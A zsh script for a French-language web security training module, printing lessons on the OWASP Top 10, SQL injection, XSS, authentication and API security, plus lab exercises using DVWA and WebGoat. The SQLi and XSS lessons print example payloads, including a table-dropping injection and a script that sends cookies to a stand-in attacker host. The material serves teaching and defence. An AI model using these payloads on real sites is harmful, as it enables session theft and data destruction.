#!/bin/zsh
# =============================================================================
# MODULE WEB - Sécurité Web
# =============================================================================
# Description: Module d'apprentissage de la sécurité web
# Author: Paul Delhomme
# Version: 1.0
# =============================================================================

CYBERLEARN_DIR="${CYBERLEARN_DIR:-$HOME/dotfiles/zsh/functions/cyberlearn}"
CYBERLEARN_MODULES_DIR="${CYBERLEARN_DIR}/modules"

# Charger les utilitaires
[ -f "$CYBERLEARN_DIR/utils/progress.sh" ] && source "$CYBERLEARN_DIR/utils/progress.sh"
[ -f "$CYBERLEARN_DIR/utils/validator.sh" ] && source "$CYBERLEARN_DIR/utils/validator.sh"

# Fonction pour exécuter le module
run_module() {
    local module_name="$1"
    local RED='\033[0;31m'
    local GREEN='\033[0;32m'
    local YELLOW='\033[1;33m'
    local BLUE='\033[0;34m'
    local CYAN='\033[0;36m'
    local BOLD='\033[1m'
    local RESET='\033[0m'
    
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║         MODULE: SÉCURITÉ WEB                                   ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}\n"
    
    # Marquer le module comme démarré
    start_module_progress "$module_name"
    
    echo -e "${GREEN}${BOLD}📚 Leçons disponibles:${RESET}\n"
    echo -e "${BOLD}1.${RESET} OWASP Top 10"
    echo -e "${BOLD}2.${RESET} Injection SQL (SQLi)"
    echo -e "${BOLD}3.${RESET} Cross-Site Scripting (XSS)"
    echo -e "${BOLD}4.${RESET} Authentification et Session"
    echo -e "${BOLD}5.${RESET} Sécurité des APIs"
    echo -e "${BOLD}6.${RESET} Exercices Pratiques"
    echo -e "${BOLD}0.${RESET} Retour"
    echo ""
    printf "Choix: "
    read -r choice
    
    case "$choice" in
        1) show_lesson_owasp ;;
        2) show_lesson_sqli ;;
        3) show_lesson_xss ;;
        4) show_lesson_auth ;;
        5) show_lesson_api ;;
        6) show_exercises_web ;;
        0) return ;;
        *) echo -e "${RED}❌ Choix invalide${RESET}"; sleep 1 ;;
    esac
}

# Leçon 1: OWASP Top 10
show_lesson_owasp() {
    clear
    echo -e "${CYAN}${BOLD}📖 Leçon 1: OWASP Top 10${RESET}\n"
    
    cat <<EOF
${BOLD}OWASP Top 10 (2021):${RESET}

${GREEN}1. Broken Access Control${RESET}
   Contournement des contrôles d'accès

${GREEN}2. Cryptographic Failures${RESET}
   Exposition de données sensibles

${GREEN}3. Injection${RESET}
   SQL, NoSQL, OS, LDAP injection

${GREEN}4. Insecure Design${RESET}
   Défauts de conception

${GREEN}5. Security Misconfiguration${RESET}
   Configurations par défaut non sécurisées

${GREEN}6. Vulnerable Components${RESET}
   Composants obsolètes/vulnérables

${GREEN}7. Authentication Failures${RESET}
   Problèmes d'authentification

${GREEN}8. Software and Data Integrity${RESET}
   Intégrité des données et logiciels

${GREEN}9. Security Logging Failures${RESET}
   Logging et monitoring insuffisants

${GREEN}10. Server-Side Request Forgery (SSRF)${RESET}
    Requêtes forgées côté serveur

${BOLD}Ressources:${RESET}
  • https://owasp.org/www-project-top-ten/
  • OWASP WebGoat (application vulnérable)
  • OWASP ZAP (scanner de sécurité)

EOF
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Leçon 2: SQL Injection
show_lesson_sqli() {
    clear
    echo -e "${CYAN}${BOLD}📖 Leçon 2: Injection SQL (SQLi)${RESET}\n"
    
    cat <<EOF
${BOLD}Qu'est-ce que SQL Injection ?${RESET}

Injection de code SQL malveillant dans une requête pour manipuler
la base de données.

${BOLD}Types:${RESET}

${GREEN}1. Union-based${RESET}
   Utilise UNION pour combiner des requêtes
   Exemple: ' UNION SELECT username, password FROM users--

${GREEN}2. Error-based${RESET}
   Exploite les messages d'erreur SQL
   Exemple: ' AND 1=CONVERT(int, (SELECT @@version))--

${GREEN}3. Blind (Boolean/Time)${RESET}
   Pas de sortie directe, inférence par booléen/timing
   Exemple: ' AND IF(1=1, SLEEP(5), 0)--

${BOLD}Exemples d'attaques:${RESET}
  • Bypass d'authentification: admin' OR '1'='1
  • Extraction de données: ' UNION SELECT * FROM users--
  • Suppression: '; DROP TABLE users;--

${BOLD}Défense:${RESET}
  • Requêtes préparées (Prepared Statements)
  • Validation des entrées
  • Principe du moindre privilège
  • Échappement des caractères spéciaux

${BOLD}Outils:${RESET}
  • sqlmap - Scanner et exploitation SQLi
  • Burp Suite - Proxy et scanner
  • OWASP ZAP - Scanner automatique

EOF
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Leçon 3: XSS
show_lesson_xss() {
    clear
    echo -e "${CYAN}${BOLD}📖 Leçon 3: Cross-Site Scripting (XSS)${RESET}\n"
    
    cat <<EOF
${BOLD}Qu'est-ce que XSS ?${RESET}

Injection de scripts JavaScript malveillants dans une page web
affichée à d'autres utilisateurs.

${BOLD}Types:${RESET}

${GREEN}1. Reflected XSS${RESET}
   Script réfléchi depuis l'URL/paramètres
   Exemple: ?search=<script>alert('XSS')</script>

${GREEN}2. Stored XSS${RESET}
   Script stocké dans la base de données
   Exemple: Commentaire avec <script>...</script>

${GREEN}3. DOM-based XSS${RESET}
   Manipulation du DOM côté client
   Exemple: document.location.hash

${BOLD}Exemples d'attaques:${RESET}
  • Vol de cookies: <script>document.location='http://attacker.com/?cookie='+document.cookie</script>
  • Keylogger: <script>document.onkeypress=function(e){...}</script>
  • Phishing: <script>document.body.innerHTML='...'</script>

${BOLD}Défense:${RESET}
  • Échappement HTML (htmlspecialchars, htmlentities)
  • Content Security Policy (CSP)
  • Validation des entrées
  • Sanitization des données utilisateur

${BOLD}Outils:${RESET}
  • XSSer - Scanner XSS
  • Burp Suite - Test manuel
  • OWASP ZAP - Détection automatique

EOF
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Leçon 4: Authentification
show_lesson_auth() {
    clear
    echo -e "${CYAN}${BOLD}📖 Leçon 4: Authentification et Session${RESET}\n"
    
    cat <<EOF
${BOLD}Problèmes d'Authentification:${RESET}

${GREEN}1. Mots de passe faibles${RESET}
   • Mots de passe par défaut
   • Mots de passe communs
   • Pas de politique de complexité

${GREEN}2. Gestion de session${RESET}
   • Tokens de session prévisibles
   • Pas d'expiration
   • Fixation de session

${GREEN}3. Brute Force${RESET}
   • Pas de limitation de tentatives
   • Pas de CAPTCHA
   • Pas de verrouillage de compte

${BOLD}Bonnes Pratiques:${RESET}
  • Mots de passe forts (12+ caractères)
  • Hash avec bcrypt/Argon2 (pas MD5/SHA1)
  • Authentification à deux facteurs (2FA)
  • HTTPS obligatoire
  • Tokens de session aléatoires et sécurisés
  • Expiration de session
  • Rate limiting

${BOLD}Attaques courantes:${RESET}
  • Brute force: hydra, medusa
  • Session hijacking: vol de cookies
  • CSRF: Cross-Site Request Forgery

${BOLD}Outils:${RESET}
  • hydra - Brute force
  • burp suite - Test d'authentification
  • jwt_tool - Analyse de tokens JWT

EOF
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Leçon 5: APIs
show_lesson_api() {
    clear
    echo -e "${CYAN}${BOLD}📖 Leçon 5: Sécurité des APIs${RESET}\n"
    
    cat <<EOF
${BOLD}Vulnérabilités API courantes:${RESET}

${GREEN}1. Broken Authentication${RESET}
   • Tokens non sécurisés
   • Pas de rate limiting

${GREEN}2. Excessive Data Exposure${RESET}
   • Retour de trop de données
   • Données sensibles exposées

${GREEN}3. Lack of Resources & Rate Limiting${RESET}
   • Pas de limitation
   • DDoS possible

${GREEN}4. Broken Function Level Authorization${RESET}
   • Contournement des permissions
   • Accès non autorisé

${GREEN}5. Mass Assignment${RESET}
   • Modification de champs non prévus

${BOLD}Bonnes Pratiques:${RESET}
  • Authentification forte (OAuth 2.0, JWT)
  • Validation des entrées
  • Rate limiting
  • Versioning des APIs
  • Documentation (OpenAPI/Swagger)
  • Logging et monitoring
  • HTTPS uniquement

${BOLD}Outils:${RESET}
  • Postman - Test d'APIs
  • Burp Suite - Scanner API
  • OWASP ZAP - Test automatique
  • jwt_tool - Analyse JWT

${BOLD}Standards:${RESET}
  • OAuth 2.0 - Autorisation
  • JWT - Tokens JSON
  • OpenAPI - Documentation

EOF
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Exercices pratiques
show_exercises_web() {
    clear
    echo -e "${CYAN}${BOLD}🎯 Exercices Pratiques - Web${RESET}\n"
    
    echo -e "${BOLD}1.${RESET} Tester une application web vulnérable"
    echo -e "${BOLD}2.${RESET} Scanner avec OWASP ZAP"
    echo -e "${BOLD}3.${RESET} Analyser les cookies et sessions"
    echo -e "${BOLD}4.${RESET} Tester l'authentification"
    echo -e "${BOLD}5.${RESET} Utiliser Burp Suite (si disponible)"
    echo -e "${BOLD}0.${RESET} Retour"
    echo ""
    printf "Choix: "
    read -r choice
    
    case "$choice" in
        1) exercise_vulnerable_web ;;
        2) exercise_owasp_zap ;;
        3) exercise_cookies_session ;;
        4) exercise_auth_test ;;
        5) exercise_burp_suite ;;
        0) return ;;
        *) echo -e "${RED}❌ Choix invalide${RESET}"; sleep 1 ;;
    esac
}

# Exercice: Application vulnérable
exercise_vulnerable_web() {
    clear
    echo -e "${CYAN}${BOLD}🎯 Exercice: Tester une Application Web Vulnérable${RESET}\n"
    
    echo "Objectif: Pratiquer sur une application web vulnérable"
    echo ""
    echo "Options:"
    echo "  1. Démarrer le lab web-basics (Docker)"
    echo "  2. Utiliser DVWA (Damn Vulnerable Web App)"
    echo "  3. Utiliser WebGoat"
    echo ""
    printf "Choix: "
    read -r choice
    
    case "$choice" in
        1)
            echo ""
            echo -e "${GREEN}Démarrage du lab web-basics...${RESET}"
            echo "Utilisez: cyberlearn lab start web-basics"
            echo "Puis accédez à: http://localhost:8080"
            ;;
        2)
            echo ""
            echo "DVWA (Damn Vulnerable Web App):"
            echo "  1. Installez Docker: installman docker"
            echo "  2. Lancez: docker run --rm -it -p 80:80 vulnerables/web-dvwa"
            echo "  3. Accédez à: http://localhost"
            echo "  4. Login: admin / password"
            ;;
        3)
            echo ""
            echo "WebGoat:"
            echo "  1. docker run -d -p 8080:8080 webgoat/goatandwolf"
            echo "  2. Accédez à: http://localhost:8080/WebGoat"
            ;;
    esac
    
    echo ""
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Exercice: OWASP ZAP
exercise_owasp_zap() {
    clear
    echo -e "${CYAN}${BOLD}🎯 Exercice: Scanner avec OWASP ZAP${RESET}\n"
    
    if ! command -v zap-cli &>/dev/null && ! command -v zap.sh &>/dev/null; then
        echo -e "${YELLOW}⚠️  OWASP ZAP n'est pas installé${RESET}"
        echo ""
        echo "Pour installer OWASP ZAP:"
        echo "  • Arch/Manjaro: yay -S owasp-zap"
        echo "  • Ou téléchargez depuis: https://www.zaproxy.org/"
        echo ""
        echo "Pour utiliser ZAP:"
        echo "  1. Lancez ZAP: zap.sh"
        echo "  2. Configurez un proxy (127.0.0.1:8080)"
        echo "  3. Naviguez vers votre site cible"
        echo "  4. Analysez les résultats"
    else
        echo -e "${GREEN}OWASP ZAP est disponible !${RESET}"
        echo ""
        echo "Commandes:"
        echo "  zap.sh                    # Interface graphique"
        echo "  zap-cli quick-scan <url>  # Scan rapide en CLI"
    fi
    
    echo ""
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Exercice: Cookies et sessions
exercise_cookies_session() {
    clear
    echo -e "${CYAN}${BOLD}🎯 Exercice: Analyser les Cookies et Sessions${RESET}\n"
    
    echo "Objectif: Comprendre la gestion des sessions web"
    echo ""
    echo "Commandes utiles:"
    echo ""
    echo -e "${GREEN}Avec curl:${RESET}"
    echo "  curl -v http://example.com                    # Voir les headers"
    echo "  curl -c cookies.txt http://example.com          # Sauvegarder les cookies"
    echo "  curl -b cookies.txt http://example.com          # Envoyer les cookies"
    echo ""
    echo -e "${GREEN}Avec browser dev tools:${RESET}"
    echo "  • F12 > Application > Cookies"
    echo "  • F12 > Network > Headers"
    echo ""
    echo -e "${GREEN}Analyser un token JWT:${RESET}"
    echo "  • https://jwt.io (décoder)"
    echo "  • jwt_tool (outil CLI)"
    echo ""
    printf "URL à analyser (ou Entrée pour passer): "
    read -r url
    
    if [ -n "$url" ]; then
        if command -v curl &>/dev/null; then
            echo ""
            echo -e "${GREEN}Headers de réponse:${RESET}"
            curl -I "$url" 2>/dev/null | grep -i "set-cookie\|session"
        fi
    fi
    
    echo ""
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Exercice: Test d'authentification
exercise_auth_test() {
    clear
    echo -e "${CYAN}${BOLD}🎯 Exercice: Tester l'Authentification${RESET}\n"
    
    echo "Objectif: Tester la robustesse de l'authentification"
    echo ""
    echo "Tests à effectuer:"
    echo "  1. Mots de passe faibles"
    echo "  2. Brute force (si autorisé)"
    echo "  3. Bypass d'authentification"
    echo "  4. Session management"
    echo ""
    echo -e "${YELLOW}⚠️  Utilisez uniquement sur des applications que vous possédez !${RESET}"
    echo ""
    echo "Outils:"
    echo "  • hydra - Brute force HTTP"
    echo "  • burp suite - Test manuel"
    echo "  • OWASP ZAP - Scanner automatique"
    echo ""
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

# Exercice: Burp Suite
exercise_burp_suite() {
    clear
    echo -e "${CYAN}${BOLD}🎯 Exercice: Utiliser Burp Suite${RESET}\n"
    
    if ! command -v burpsuite &>/dev/null; then
        echo -e "${YELLOW}⚠️  Burp Suite n'est pas installé${RESET}"
        echo ""
        echo "Burp Suite Community (gratuit):"
        echo "  • Téléchargez depuis: https://portswigger.net/burp/communitydownload"
        echo "  • Ou: yay -S burpsuite (Arch/Manjaro)"
        echo ""
        echo "Utilisation de base:"
        echo "  1. Lancez Burp Suite"
        echo "  2. Configurez le proxy (127.0.0.1:8080)"
        echo "  3. Configurez votre navigateur pour utiliser le proxy"
        echo "  4. Interceptez et modifiez les requêtes"
        echo "  5. Utilisez le scanner automatique"
    else
        echo -e "${GREEN}Burp Suite est disponible !${RESET}"
        echo ""
        echo "Lancez: burpsuite"
    fi
    
    echo ""
    read -k 1 "?Appuyez sur une touche pour continuer..."
}

